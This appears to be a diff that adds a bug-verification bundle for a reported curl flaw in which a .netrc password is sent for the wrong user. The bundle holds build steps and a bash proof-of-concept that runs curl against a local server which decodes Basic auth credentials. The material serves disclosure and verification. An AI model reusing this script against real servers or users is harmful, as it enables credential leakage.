@@ -1,0 +1,16 @@
+{
+ "schema": "slopproof.bundle/v1",
+ "claim": "curl sends the .netrc password of user alice when the URL names user bob (HackerOne #3735184)",
+ "repo": "https://github.com/curl/curl",
+ "commit": "e9b9bbac22c26cf67316fa8e6c6b9e831af31949",
+ "sandbox_image": "sha256:6f8915a2be42aba3ca62c50fd7b03c41d3f0d0e937db78daf5ffa708bd4fbc6f",
+ "build": "(autoreconf -fi || ./buildconf) && ./configure --with-openssl --disable-shared --enable-debug --enable-websockets CC=clang CFLAGS='-fsanitize=address,undefined -g -O1' LDFLAGS='-fsanitize=address,undefined' && make -j6",
+ "files": {
+  "/work/poc.sh": "#!/usr/bin/env bash\nset -euo pipefail\n\ntmp=\"$(mktemp -d)\"\nport=18080\n\nmkdir -p \"$tmp/home\"\n\ncat >\"$tmp/home/.netrc\" <<'EOF'\nmachine 127.0.0.1 login alice password secret\nEOF\nchmod 0600 \"$tmp/home/.netrc\"\n\ncat >\"$tmp/server.py\" <<'PY'\nimport base64\nimport http.server\nimport socketserver\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        auth = self.headers.get(\"Authorization\", \"\")\n        print(\"Authorization:\", auth, flush=True)\n        if auth.startswith(\"Basic \"):\n            decoded = base64.b64decode(auth.split(\" \", 1)[1]).decode()\n            print(\"Decoded:\", decoded, flush=True)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"ok\\n\")\n\n    def log_message(self, fmt, *args):\n        pass\n\nwith socketserver.TCPServer((\"127.0.0.1\", 18080), Handler) as httpd:\n    httpd.handle_request()\nPY\n\npython3 \"$tmp/server.py\" &\nserver_pid=$!\nsleep 0.3\n\nHOME=\"$tmp/home\" /work/repo/src/curl \\\n    --silent \\\n    --show-error \\\n    --netrc-optional \\\n    \"http://bob@127.0.0.1:$port/\" \\\n    >/dev/null\n\nwait \"$server_pid\""
+ },
+ "setup": "",
+ "check": "bash /work/poc.sh | grep -q '^Decoded: bob:secret$'",
+ "expect_output": null,
+ "created_at": "2026-10-26T07:13:26Z",
+ "sha256": "37a0dff8536a3be19a78dfd77bd78108be1ef9e8065fc7fa279c9499012cedf6"
+}
